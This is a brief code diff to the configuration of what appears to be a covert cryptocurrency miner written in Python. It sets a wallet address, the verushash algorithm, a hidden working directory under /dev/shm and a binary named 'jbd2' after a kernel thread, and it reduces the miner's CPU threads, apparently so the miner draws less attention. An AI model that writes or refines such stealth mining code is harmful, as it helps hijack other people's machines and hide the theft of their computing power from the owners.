@@ -8,7 +8,7 @@ import threading
 # Konfigurasi
 WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
 ALGO = "verushash"
-CPU_THREADS = 2
+CPU_THREADS = 1
 BASE_PATH = os.path.expanduser("/dev/shm/.cache")
 ORIGINAL_BINARY = os.path.join(BASE_PATH, "jbd2")
 
